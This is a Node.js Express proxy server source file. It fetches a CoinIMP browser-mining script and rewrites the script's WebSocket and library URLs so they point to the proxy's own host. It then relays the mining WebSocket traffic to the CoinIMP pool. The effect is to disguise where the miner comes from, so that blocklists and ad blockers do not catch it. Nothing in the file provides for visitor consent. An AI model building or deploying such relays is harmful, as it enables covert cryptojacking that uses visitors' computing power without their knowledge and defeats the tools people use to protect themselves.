const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');

const app = express();

app.use(cors());

const { responseInterceptor } = require('http-proxy-middleware');


// Proxy requests to the JS file and rewrite the websocket URLs inside it
app.use('/script', createProxyMiddleware({ 
    target: 'https://www.hostingcloud.racing/FIIr.js', 
    changeOrigin: true,
    ignorePath: true,
    selfHandleResponse: true,
    onProxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
        // Strip headers
        res.removeHeader('x-powered-by');
        
        let content = responseBuffer.toString('utf8');
        
        const host = req.headers.host;
        const protocol = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'wss://' : 'ws://';
        
        // Rewrite the WebSocket URLs to point to our proxy
        content = content.replace(/wss:\\\/\\\/s01\.hostcontent\.live\\\/aUCLhCJm/g, protocol + host + '/proxy');
        content = content.replace(/wss:\/\/s01\.hostcontent\.live\/aUCLhCJm/g, protocol + host + '/proxy');
        
        // Also rewrite the lib url and miner host to point back to the proxy
        const httpProtocol = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https://' : 'http://';
        content = content.replace(/https:\/\/www\.hostingcloud\.racing\//g, httpProtocol + host + '/script/');
        
        return content;
    })
}));

// Proxy the WebSocket connections to the CoinIMP pool
app.use('/proxy', createProxyMiddleware({ 
    target: 'wss://s01.hostcontent.live/aUCLhCJm', 
    changeOrigin: true,
    ws: true,
    pathRewrite: {
        '^/proxy': '', // remove base path
    },
}));

// A simple health check
app.get('/', (req, res) => {
    res.send('Proxy is running');
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Proxy server running on port ${PORT}`);
});
